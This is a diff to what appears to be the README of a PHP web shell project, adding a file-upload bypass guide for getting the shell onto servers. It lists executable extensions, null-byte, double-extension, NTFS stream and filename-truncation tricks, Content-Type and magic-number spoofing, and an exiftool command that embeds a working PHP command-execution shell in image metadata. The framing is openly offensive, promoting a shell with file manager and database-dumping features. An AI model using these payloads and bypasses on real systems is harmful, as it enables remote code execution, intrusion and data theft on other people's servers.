@@ -37,6 +37,83 @@ But if the payload-image doesnt work. Use some file upload bypass tricks
 
 Hahah, make sure you use with care!! 
 ```
+# File Upload Bypass 
+<h4>File Upload General Methodology</h4>
+Other useful extensions:<br>
+<b>PHP:</b> .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc <br>
+<b>ASP:</b> .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml <br>
+<b>Jsp:</b> .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action <br>
+<b>Coldfusion:</b> .cfm, .cfml, .cfc, .dbm <br>
+<b>Flash:</b> .swf <br>
+<b>Perl:</b> .pl, .cgi <br>
+<b>Erlang Yaws Web Server:</b> .yaws <br>
+<br/>
+<h3>Bypass file extensions checks</h3>
+1) If they apply, the check the previous extensions. Also test them using some uppercase letters: <code>pHp, .pHP5, .PhAr ..</code> <br>
+2) Check adding a valid extension before the execution extension (use previous extensions also):<br><br>
+<code>
+file.png.php
+file.png.Php5
+</code>
+<br/>
+3) Try adding special characters at the end. You could use Burp to bruteforce all the ascii and Unicode characters. (Note that you can also try to use the previously motioned extensions) <br>
+<code>
+file.php%20<br/>
+file.php%0a<br/>
+file.php%00<br/>
+file.php%0d%0a<br/>
+file.php/<br/>
+file.php.\<br/>
+file.<br/>
+file.php....<br/>
+file.pHp5...<br/>
+</code>
+<br>
+4) Try to bypass the protections tricking the extension parser of the server-side with techniques like doubling the extension or adding junk data (null bytes) between extensions. You can also use the previous extensions to prepare a better payload.<br/>
+<code>
+file.png.php<br/>
+file.png.pHp5<br/>
+file.php%00.png<br/>
+file.php\x00.png<br/>
+file.php%0a.png<br/>
+file.php%0d%0a.png<br/>
+flile.phpJunk123png<br/>
+</code><br/>
+<br>
+5) Add another layer of extensions to the previous check: <br/>
+<code>
+file.png.jpg.php
+file.php%00.png%00.jpg
+</code>
+<br>
+6) Try to put the exec extension before the valid extension and pray so the server is misconfigured. **(useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php** will execute code): <br>
+<code>
+ex: file.php.png 
+</code>
+<br>
+7) Using NTFS alternate data stream (ADS) in Windows. In this case, a colon character “:” will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. “file.asax:.jpg”). This file might be edited later using other techniques such as using its short filename. The “::$data” pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. “file.asp::$data.”) <br><br>
+8) Try to break the filename limits. The valid extension gets cut off. And the malicious PHP gets left. AAA<--SNIP-->AAA.php <br>
+
+```
+# Linux maximum 255 bytes
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
+# Upload the file and check response how many characters it alllows. Let's say 236
+python -c 'print "A" * 232'
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+# Make the payload
+AAA<--SNIP 232 A-->AAA.php.png
+```
+
+<h2> Bypass Content-Type & magic number </h2>
+1) Bypass Content-Type checks by setting the value of the Content-Type header to: <b>image/png</b> , <b>text/plain</b> ,<b> application/octet-stream</b><br>
+>> Content-Type wordlist: https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt <br>
+<br>
+2) Bypass magic number check by adding at the beginning of the file the bytes of a real image (confuse the file command). Or introduce the shell inside the metadata: <br><code>exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg </code>
+ <br>
+
+Or you can try other tricks you know that might work. Haha
+
 # Some features of ths1335 Shell
 1) File Manager
 2) Dumping SQL database 
